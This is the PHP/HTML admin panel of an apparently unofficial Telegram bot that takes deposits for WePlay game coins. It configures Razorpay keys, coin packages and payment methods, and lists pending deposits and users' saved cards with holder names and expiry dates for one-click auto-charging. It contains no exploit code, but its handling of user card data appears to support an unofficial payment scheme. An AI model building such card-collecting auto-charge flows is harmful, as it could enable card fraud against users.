header('X-Frame-Options: SAMEORIGIN');
header('X-Content-Type-Options: nosniff');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WePlay Deposit Bot <?= WPB_VERSION ?></title>
<style>
:root{--bg:#0d1017;--s1:#141a24;--s2:#1b2330;--b:#2b3545;--t:#eef3ff;--td:#9aa8bd;--c:#6ee7ff;--g:#37ff8b;--r:#ff5470;--y:#ffd166}
*{box-sizing:border-box;margin:0;padding:0}body{background:var(--bg);color:var(--t);font-family:Segoe UI,system-ui,sans-serif;font-size:14px;min-height:100vh}.wrap{max-width:920px;margin:0 auto;padding:20px 16px}.card{background:var(--s1);border:1px solid var(--b);border-radius:12px;padding:18px;margin-bottom:16px}h1{color:var(--c);font-size:23px}.sub{color:var(--td);font-size:12px;margin:4px 0 18px}.row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px}.f1{flex:1;min-width:240px}label{display:block;color:var(--td);font-size:11px;margin-bottom:4px}input,textarea{width:100%;background:var(--s2);border:1px solid var(--b);color:var(--t);border-radius:7px;padding:9px 10px;font:inherit;outline:none}textarea{min-height:72px;font-family:monospace;font-size:12px}.btn{display:inline-flex;align-items:center;gap:6px;border:0;border-radius:7px;padding:8px 14px;font-weight:700;cursor:pointer}.bc{background:var(--c);color:#001017}.bg{background:var(--g);color:#001508}.br{background:var(--r);color:#fff}.bgr{background:var(--s2);color:var(--t);border:1px solid var(--b)}.login-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center}.login-box{width:330px;background:var(--s1);border:1px solid var(--b);border-radius:14px;padding:30px;text-align:center}.log-box,.pending-box{background:var(--s2);border:1px solid var(--b);border-radius:8px;padding:12px;max-height:320px;overflow:auto;font-family:monospace;font-size:11px}.ok{color:var(--g)}.err{color:var(--r)}.info{color:var(--c)}.toast{position:fixed;right:22px;bottom:22px;background:var(--s1);border:1px solid var(--c);border-radius:8px;padding:12px 16px;color:var(--c);opacity:0;transition:.2s}.toast.show{opacity:1}
</style>
</head>
<body>
<?php if (!$isLoggedIn): ?>
<div class="login-wrap"><div class="login-box">
  <h2>🎮 WePlay Bot</h2><p class="sub">Admin Panel</p>
  <label>Password</label><input type="password" id="pass" onkeydown="if(event.key==='Enter')login()">
  <button class="btn bc" style="width:100%;justify-content:center;margin-top:12px" onclick="login()">Login</button>
  <div id="err" class="err" style="margin-top:10px;font-size:12px"></div>
</div></div>
<script>
async function login(){const fd=new FormData();fd.append('pass',document.getElementById('pass').value);const r=await fetch('?api_action=login',{method:'POST',body:fd}).then(x=>x.json());if(r.ok)location.reload();else document.getElementById('err').textContent=r.error||'Wrong password'}
document.getElementById('pass').focus();
</script></body></html>
<?php exit; endif; ?>

<div class="wrap">
  <h1>🎮 Rebel WePlay Deposit Bot <small style="font-size:13px;color:var(--td)">v<?= WPB_VERSION ?></small></h1>
  <div class="sub">Telegram deposit/withdrawal flow for weplayapp.com | <a href="?api_action=logout" style="color:var(--r)">Logout</a></div>

  <div class="card">
    <h2>⚙️ Config</h2>
    <div class="row"><div class="f1"><label>Bot Token</label><input id="bot_token" type="password"></div><div class="f1"><label>Admin Chat ID</label><input id="admin_chat_id"></div></div>
    <div class="row"><div class="f1"><label>Min Deposit</label><input id="min_deposit" type="number"></div><div class="f1"><label>Max Deposit</label><input id="max_deposit" type="number"></div></div>
    <div class="row"><div class="f1"><label>WePlay Site</label><input id="weplay_site"></div><div class="f1"><label>WePlay Recharge Link</label><input id="weplay_recharge"></div></div>
    <div class="row"><div class="f1"><label>Support Contact</label><input id="support_contact"></div><div class="f1"><label>Change Admin Password</label><input id="new_pass" type="password" placeholder="blank = no change"></div></div>
    <div class="row"><div class="f1"><label>Welcome Message</label><textarea id="welcome_msg"></textarea></div><div class="f1"><label>Deposit Thanks Message</label><textarea id="deposit_thanks"></textarea></div></div>
    <div class="row"><div class="f1"><label>Card Safety Notice</label><textarea id="card_notice"></textarea></div></div>
    <button class="btn bc" onclick="saveConfig()">💾 Save</button>
    <button class="btn bg" onclick="setWebhook()">🔗 Set Webhook</button>
    <button class="btn br" onclick="removeWebhook()">Remove Webhook</button>
  </div>

  <div class="card">
    <h2>⚡ Razorpay / Auto-Charge Config</h2>
    <p class="sub">Enter your Razorpay credentials to enable automatic card payment links and one-click auto-charge for saved cards.</p>
    <div class="row">
      <div class="f1"><label>Razorpay Key ID</label><input id="razorpay_key_id" placeholder="rzp_live_..."></div>
      <div class="f1"><label>Razorpay Key Secret</label><input id="razorpay_key_secret" type="password" placeholder="secret key"></div>
    </div>
    <div class="row">
      <div class="f1"><label>Razorpay Webhook Secret</label><input id="razorpay_webhook_secret" type="password" placeholder="webhook signing secret"></div>
      <div class="f1" style="display:flex;align-items:flex-end;gap:10px">
        <label style="display:flex;align-items:center;gap:8px;margin-bottom:0;cursor:pointer">
          <input type="checkbox" id="autocharge_enabled" style="width:auto"> Enable Auto-Charge Feature
        </label>
      </div>
    </div>
    <div style="display:flex;gap:8px;flex-wrap:wrap">
      <button class="btn bc" onclick="saveRzpConfig()">💾 Save Razorpay Config</button>
      <button class="btn bgr" onclick="showRzpWebhookUrl()">📋 Get Webhook URL</button>
    </div>
    <div id="rzp-webhook-info" style="margin-top:10px;display:none;background:var(--s2);border:1px solid var(--b);border-radius:7px;padding:10px;font-size:12px;font-family:monospace;word-break:break-all"></div>
  </div>

  <div class="card">
    <h2>🪙 Coin Packages</h2>
    <p class="sub">These appear as buttons in the bot after the user links their WePlay ID.</p>
    <div id="coin-packages-list"></div>
    <div style="margin-top:10px;display:flex;gap:8px;">
      <button class="btn bg" onclick="addCoinPkg()">+ Add Package</button>
      <button class="btn bc" onclick="saveCoinPackages()">💾 Save Packages</button>
    </div>
  </div>

  <div class="card">
    <h2>💳 Payment Methods</h2>
    <p class="sub">These appear as buttons after user selects a coin package. Use <code>autocharge</code> as ID for the auto-charge option.</p>
    <div id="payment-methods-list"></div>
    <div style="margin-top:10px;display:flex;gap:8px;">
      <button class="btn bg" onclick="addPayMethod()">+ Add Method</button>
      <button class="btn bc" onclick="savePayMethods()">💾 Save Methods</button>
    </div>
  </div>

  <div class="card">
    <h2>💾 Saved Cards (Auto-Charge Users)</h2>
    <p class="sub">Users who have saved their card via Razorpay for auto-charging.</p>
    <button class="btn bgr" onclick="loadSavedCards()">Refresh</button>
    <div id="saved-cards" class="pending-box" style="margin-top:10px">Loading...</div>
  </div>

  <div class="card">
    <h2>🧾 Pending Deposits</h2>
    <button class="btn bgr" onclick="loadPending()">Refresh Pending</button>
    <div id="pending" class="pending-box" style="margin-top:10px">Loading...</div>
  </div>

  <div class="card">
    <h2>📋 Logs</h2>
    <button class="btn bgr" onclick="loadLogs()">Refresh Logs</button>
    <button class="btn bgr" onclick="clearLogs()">Clear Logs</button>
    <div id="logs" class="log-box" style="margin-top:10px">Loading...</div>
  </div>
</div>
<div class="toast" id="toast"></div>
<script>
function g(id){return document.getElementById(id)}
function toast(msg){const t=g('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2500)}
async function api(action,payload={}){return fetch('?api_action='+action,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(x=>x.json()).catch(e=>({ok:false,error:String(e)}))}

let _coinPkgs=[];
let _payMethods=[];

async function loadConfig(){
  const r=await fetch('?api_action=get_config').then(x=>x.json());
  if(!r.ok)return;
  for(const [k,v] of Object.entries(r.data||{})){
    if(g(k)&&typeof v==='string')g(k).value=v;
    else if(g(k)&&typeof v==='number')g(k).value=v;
  }
  if(g('autocharge_enabled'))g('autocharge_enabled').checked=!!(r.data.autocharge_enabled);
  _coinPkgs=(r.data.coin_packages||[]).map(p=>({...p}));
  _payMethods=(r.data.payment_methods||[]).map(m=>({...m}));
  renderCoinPkgs();renderPayMethods();
}

function renderCoinPkgs(){
  const el=g('coin-packages-list');
  el.innerHTML=_coinPkgs.map((p,i)=>`
    <div style="display:flex;gap:8px;margin-bottom:8px;align-items:center;">
      <input style="flex:2" placeholder="Label (e.g. 60 Coins — ₹80)" value="${esc(p.label||'')}" oninput="_coinPkgs[${i}].label=this.value">
      <input style="flex:1;max-width:100px" type="number" placeholder="Coins" value="${p.coins||''}" oninput="_coinPkgs[${i}].coins=Number(this.value)">
      <input style="flex:1;max-width:100px" type="number" placeholder="Price ₹" value="${p.price||''}" oninput="_coinPkgs[${i}].price=Number(this.value)">
      <button class="btn br" style="padding:6px 10px" onclick="_coinPkgs.splice(${i},1);renderCoinPkgs()">✕</button>
    </div>`).join('');
}

function addCoinPkg(){_coinPkgs.push({label:'',coins:0,price:0});renderCoinPkgs()}

async function saveCoinPackages(){
  const r=await api('save_config',{coin_packages:_coinPkgs});
  toast(r.ok?'Coin packages saved':'Error: '+(r.error||''));
}

function renderPayMethods(){
  const el=g('payment-methods-list');
  el.innerHTML=_payMethods.map((m,i)=>`
    <div style="display:flex;gap:8px;margin-bottom:8px;align-items:center;">
      <input style="flex:2" placeholder="Label (e.g. 💳 UPI / Google Pay)" value="${esc(m.label||'')}" oninput="_payMethods[${i}].label=this.value">
      <input style="flex:1;max-width:160px" placeholder="ID (e.g. upi)" value="${esc(m.id||'')}" oninput="_payMethods[${i}].id=this.value.replace(/[^a-z0-9_]/g,'')">
      <button class="btn br" style="padding:6px 10px" onclick="_payMethods.splice(${i},1);renderPayMethods()">✕</button>
    </div>`).join('');
}

function addPayMethod(){_payMethods.push({label:'',id:''});renderPayMethods()}

async function savePayMethods(){
  const r=await api('save_config',{payment_methods:_payMethods});
  toast(r.ok?'Payment methods saved':'Error: '+(r.error||''));
}

async function saveConfig(){
  const keys=['bot_token','admin_chat_id','min_deposit','max_deposit','weplay_site','weplay_recharge','support_contact','welcome_msg','deposit_thanks','card_notice','new_pass'];
  const p={};keys.forEach(k=>{if(g(k))p[k]=g(k).value});
  const r=await api('save_config',p);toast(r.ok?'Saved':'Error: '+(r.error||''))
}

async function saveRzpConfig(){
  const p={
    razorpay_key_id:g('razorpay_key_id').value,
    razorpay_key_secret:g('razorpay_key_secret').value,
    razorpay_webhook_secret:g('razorpay_webhook_secret').value,
    autocharge_enabled:g('autocharge_enabled').checked,
  };
  const r=await api('save_config',p);
  toast(r.ok?'Razorpay config saved':'Error: '+(r.error||''));
}

async function showRzpWebhookUrl(){
  const r=await api('set_rzp_webhook');
  const box=g('rzp-webhook-info');
  if(r.ok){
    box.innerHTML='<b>Razorpay Webhook URL:</b><br><span style="color:var(--g)">'
      +esc(r.webhook_url)+'</span><br><small style="color:var(--td)">'+esc(r.note||'')+'</small>';
    box.style.display='block';
  } else {
    toast('Error: '+(r.error||''));
  }
}

async function setWebhook(){const r=await api('set_webhook');toast(r.ok?'Webhook set':'Error: '+(r.error||r.tg?.description||''))}
async function removeWebhook(){const r=await api('remove_webhook');toast(r.ok?'Webhook removed':'Error')}
async function loadLogs(){const r=await fetch('?api_action=get_logs').then(x=>x.json());const box=g('logs');if(!r.ok||!r.data?.length){box.textContent='No logs';return}box.innerHTML=r.data.map(l=>`<div class="${l.type==='success'?'ok':l.type==='error'?'err':'info'}">[${new Date(l.time).toLocaleString()}] ${esc(l.text)}</div>`).join('')}
async function clearLogs(){await api('clear_logs');loadLogs();toast('Logs cleared')}
async function loadPending(){
  const r=await fetch('?api_action=get_pending').then(x=>x.json());
  const box=g('pending');
  const rows=Object.values(r.data||{}).reverse();
  if(!rows.length){box.textContent='No pending deposits';return}
  box.innerHTML=rows.map(p=>`<div style="border-bottom:1px solid var(--b);padding:7px 0">
    <b>${esc(p.txn_id)}</b> <span class="${p.status==='approved'?'ok':p.status==='rejected'?'err':p.status==='autocharge_processing'?'info':'info'}">${esc(p.status)}</span>
    ${p.auto_charged?'<span style="color:var(--y)"> ⚡auto</span>':''}
    ${p.rzp_payment_id?'<span style="color:var(--td)"> | Rzp: '+esc(p.rzp_payment_id)+'</span>':''}
    <br>WePlay: ${esc(p.weplay_id)} | Coins: ${esc(p.coins||'—')} | Amount: ₹${Number(p.amount||0).toFixed(2)} | Method: ${esc(p.payment_method||'card')} | Chat: ${esc(p.chat_id)}
  </div>`).join('')
}

async function loadSavedCards(){
  const r=await fetch('?api_action=get_saved_cards').then(x=>x.json());
  const box=g('saved-cards');
  const rows=(r.data||[]);
  if(!rows.length){box.textContent='No saved cards';return}
  box.innerHTML=rows.map((c,i)=>`<div style="border-bottom:1px solid var(--b);padding:8px 0;display:flex;align-items:center;gap:8px;flex-wrap:wrap">
    <span><b>Chat:</b> ${esc(c.chat_id)}</span>
    <span><b>Card ${Number(c.card_idx)+1}${c.is_default?' ⭐':''}:</b> ${c.last4?'•••• '+esc(c.last4)+' '+esc(c.network||''):'–'}</span>
    ${c.holder_name?`<span><b>Name:</b> ${esc(c.holder_name)}</span>`:''}
    ${c.expiry_month?`<span><b>Exp:</b> ${esc(c.expiry_month)}/${esc(c.expiry_year||'')}</span>`:''}
    <span><b>Type:</b> ${esc(c.type||'manual')}</span>
    <span><b>AC:</b> <span class="${c.autocharge?'ok':'err'}">${c.autocharge?'⚡ ON':'⏸ OFF'}</span></span>
    <span style="color:var(--td);font-size:11px">${new Date(c.saved_at||0).toLocaleString()}</span>
    <button class="btn bgr" style="padding:4px 8px;font-size:11px" onclick="toggleAC('${esc(c.chat_id)}',${c.card_idx},${c.autocharge?'false':'true'})">${c.autocharge?'Disable AC':'Enable AC'}</button>
    <button class="btn br" style="padding:4px 8px;font-size:11px" onclick="removeCard('${esc(c.chat_id)}',${c.card_idx})">Remove</button>
  </div>`).join('')
}

async function toggleAC(chatId,cardIdx,enable){
  const r=await api('toggle_autocharge',{chat_id:chatId,card_idx:Number(cardIdx),enabled:enable==='true'||enable===true});
  toast(r.ok?'Updated':'Error');
  loadSavedCards();
}

async function removeCard(chatId,cardIdx){
  if(!confirm('Remove card #'+(Number(cardIdx)+1)+' for chat '+chatId+'?'))return;
  const r=await api('delete_saved_card',{chat_id:chatId,card_idx:Number(cardIdx)});
  toast(r.ok?'Removed':'Error');
  loadSavedCards();
}

function esc(s){return String(s??'').replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[m]))}
loadConfig();loadLogs();loadPending();loadSavedCards();
</script>
</body>
</html>
